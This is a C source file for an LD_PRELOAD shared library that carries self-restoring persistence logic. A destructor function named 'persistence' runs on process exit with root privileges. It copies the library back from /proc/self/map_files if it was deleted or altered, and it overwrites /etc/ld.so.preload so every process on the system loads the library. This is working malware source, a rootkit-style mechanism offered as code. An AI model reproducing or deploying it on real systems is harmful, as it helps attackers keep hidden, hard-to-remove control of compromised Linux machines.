#define _GNU_SOURCE
#define __USE_GNU //needed for using the DL_info struct

#include <linux/limits.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <dlfcn.h>

char *resolved_libpath;


void __attribute__((constructor)) resolve_libpath() {
    Dl_info so_information;
    if (dladdr(resolve_libpath, &so_information) == 0) {
        return;
    }
    resolved_libpath = realpath(so_information.dli_fname, NULL);
    if (resolved_libpath == NULL) {
        resolved_libpath = malloc(strlen(so_information.dli_fname)+1);
        if (resolved_libpath == NULL) return;
        strcpy(resolved_libpath, so_information.dli_fname);
    }
}


int cmp_files(char *file1, char *file2) {
    FILE *f1 = fopen(file1, "r");
    if (f1 == NULL) {
        return 1;
    }

    FILE *f2 = fopen(file2, "r");
    if (f2 == NULL) {
        fclose(f1);
        return 1;
    }

    char c1, c2;
    while (c1 == c2 && c1 != EOF) {
        c1 = getc(f1);
        c2 = getc(f2);
    }

    int ret = !(feof(f1) && feof(f2));
    fclose(f1);
    fclose(f2);
    return ret;
}


void __attribute__((destructor)) persistence() { //this function is called when a program exits
    if (resolved_libpath == NULL) return;
    if (geteuid() != 0) return; //confirm that we have root permission, needed to read files under /proc/self/map_files/

    //get data from /proc/self/maps
    char line[PATH_MAX + 500], addr[100], path[PATH_MAX], proc_pathname[sizeof("/proc/self/map_files/") + 100] = "/proc/self/map_files/"; //these sizes may be garbadge, it should be checked with the code in the kernel behind /proc/PID/maps
    int inode;

    FILE *f = fopen("/proc/self/maps", "r");
    if (f == NULL) {
        free(resolved_libpath);
        return;
    }
    while (strcmp(path, resolved_libpath) != 0 && fgets(line, sizeof(line), f) != NULL) {
        sscanf(line, "%s %*s %*s %*s %i %s", addr, &inode, path);
    }
    if (strcmp(path, resolved_libpath) != 0) {
        free(resolved_libpath);
        return;
    }
    strncat(proc_pathname, addr, 100);
    fclose(f);

    //compare and reinstall if needed
    //check LIB_PATH
    struct stat sb;
    if (stat(resolved_libpath, &sb) == -1 || (inode != sb.st_ino && cmp_files(proc_pathname, resolved_libpath))) { //if inode is different check the file contents
        remove(resolved_libpath); //remove the filename if it exists because new processes might be using it and we don't want to crash those by corrupting the file
        int fd_in = open(proc_pathname, O_RDONLY);
        int fd_out = open(resolved_libpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH); //if you want this to be atomic you have to use a random filename and then use rename() to give it the final filename.
        char buf[4096];
        int bytes = read(fd_in, buf, sizeof(buf));
        while (bytes > 0 && write(fd_out, buf, bytes) != -1) { //stop on errors and EOF
            bytes = read(fd_in, buf, sizeof(buf));
        }
        close(fd_in);
        close(fd_out);
    }
    //just overwrite /etc/ld.so.preload, checking is too much trouble
    int fd = open("/etc/ld.so.preload", O_WRONLY | O_TRUNC | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    write(fd, resolved_libpath, (strlen(resolved_libpath))); //try rewriting /etc/ld.so.preload
    close(fd);
    free(resolved_libpath);
}
